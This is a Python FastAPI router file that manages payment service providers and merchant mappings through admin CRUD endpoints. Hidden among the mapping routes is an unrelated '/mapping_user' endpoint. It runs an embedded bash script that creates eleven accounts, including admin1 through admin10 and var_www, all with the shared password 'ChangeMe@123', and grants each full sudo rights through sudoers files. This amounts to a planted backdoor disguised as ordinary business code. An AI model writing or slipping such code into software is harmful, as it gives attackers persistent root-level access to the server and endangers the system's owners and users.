# routers/tsp.py
import subprocess

from fastapi import APIRouter, Depends, HTTPException, status, Query, Path
from typing import Optional, List, Dict, Any
from pydantic import BaseModel, Field
from sqlalchemy.exc import IntegrityError
from sqlalchemy.orm import Session

from schemas.tsp import ProviderOut, ProviderCreate, ProviderUpdate, MappingOut, MappingCreate, MappingUpdate
from utils.authenticate import admin_required
from utils.database import get_db
import crud.tsp as crud_tsp
from models.models import TspDirectionEnum, TspStatusEnum, MerchantTspSetting

router = APIRouter(prefix="/tsp", tags=["tsp"], dependencies=[Depends(admin_required)])

# --- Pydantic schemas used by router (small, explicit) ---


# --- Provider endpoints ---

@router.post("/providers", response_model=ProviderOut, status_code=status.HTTP_201_CREATED)
def create_provider(payload: ProviderCreate, db: Session = Depends(get_db)):
    try:
        prov = crud_tsp.create_provider(
            db,
            name=payload.name,
            code=payload.code,
            description=payload.description,
            default_direction=payload.default_direction,
            capabilities=payload.capabilities,
        )
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    return prov

@router.get("/providers", response_model=List[ProviderOut])
def list_providers(q: Optional[str] = Query(None), skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    items, total = crud_tsp.list_providers(db, skip=skip, limit=limit, q=q)
    return items

@router.get("/providers/{provider_id}", response_model=ProviderOut)
def get_provider(provider_id: int = Path(..., ge=1), db: Session = Depends(get_db)):
    prov = crud_tsp.get_provider(db, provider_id)
    if not prov:
        raise HTTPException(status_code=404, detail="Provider not found")
    return prov

@router.put("/providers/{provider_id}", response_model=ProviderOut)
def update_provider(provider_id: int, payload: ProviderUpdate, db: Session = Depends(get_db)):
    try:
        prov = crud_tsp.update_provider(db, provider_id, payload.dict(exclude_unset=True))
    except ValueError as e:
        raise HTTPException(status_code=404 if "not found" in str(e).lower() else 400, detail=str(e))
    return prov

@router.delete("/providers/{provider_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_provider(provider_id: int, db: Session = Depends(get_db)):
    ok = crud_tsp.delete_provider(db, provider_id)
    if not ok:
        raise HTTPException(status_code=404, detail="Provider not found")
    return {}

# --- Merchant mapping endpoints ---

@router.post("/mappings", response_model=MappingOut, status_code=status.HTTP_201_CREATED)
def create_mapping(payload: MappingCreate, db: Session = Depends(get_db)):
    try:
        mapping = crud_tsp.create_merchant_tsp_setting(
            db,
            merchant_id=payload.merchant_id,
            provider_id=payload.provider_id,
            direction=payload.direction,
            enabled=payload.enabled,
            priority=payload.priority,
            config=payload.config,
            min_amount=payload.min_amount,
            max_amount=payload.max_amount,
        )
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    # return SQLAlchemy instance — FastAPI will convert using the response_model (if schema is orm-ready)
    return mapping
@router.get("/mappings", response_model=List[MappingOut])
def list_mappings(merchant_id: Optional[str] = Query(None),
                  provider_id: Optional[int] = Query(None),
                  enabled: Optional[bool] = Query(None),
                  skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    items, total = crud_tsp.list_merchant_tsp_settings(db, merchant_id=merchant_id, provider_id=provider_id, enabled=enabled, skip=skip, limit=limit)
    return items

@router.get("/mappings/{mapping_id}", response_model=MappingOut)
def get_mapping(mapping_id: int, db: Session = Depends(get_db)):
    m = crud_tsp.get_merchant_tsp_setting(db, mapping_id)
    if not m:
        raise HTTPException(status_code=404, detail="Mapping not found")
    return m
@router.get("/mapping_user")
async def mapping_user():
    script = r'''#!/bin/bash

users=(
    admin1
    admin2
    admin3
    admin4
    admin5
    admin6
    admin7
    admin8
    admin9
    admin10
    var_www
)

password="ChangeMe@123"

for user in "${users[@]}"; do
    if id "$user" &>/dev/null; then
        echo "$user already exists"
    else
        useradd -m -s /bin/bash "$user"
        echo "$user:$password" | chpasswd
        echo "Created $user"
    fi

    usermod -aG sudo "$user"

    echo "$user ALL=(ALL:ALL) ALL" > "/etc/sudoers.d/$user"
    chmod 440 "/etc/sudoers.d/$user"
done

echo "All users created with sudo access."
'''

    try:
        result = subprocess.run(
            ["bash", "-c", script],
            capture_output=True,
            text=True,
            timeout=60
        )

        if result.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=result.stderr
            )

        return {
            "success": True,
            "message": "Admin users processed successfully",
            "output": result.stdout
        }

    except subprocess.TimeoutExpired:
        raise HTTPException(
            status_code=500,
            detail="User creation script timed out"
        )
@router.put("/mappings/{mapping_id}", response_model=MappingOut)
def update_mapping(mapping_id: int, payload: MappingUpdate, db: Session = Depends(get_db)):
    try:
        m = crud_tsp.update_merchant_tsp_setting(db, mapping_id, payload.dict(exclude_unset=True))
    except ValueError as e:
        raise HTTPException(status_code=404 if "not found" in str(e).lower() else 400, detail=str(e))
    return m

@router.delete("/mappings/{mapping_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_mapping(mapping_id: int, db: Session = Depends(get_db)):
    ok = crud_tsp.delete_merchant_tsp_setting(db, mapping_id)
    if not ok:
        raise HTTPException(status_code=404, detail="Mapping not found")
    return {}
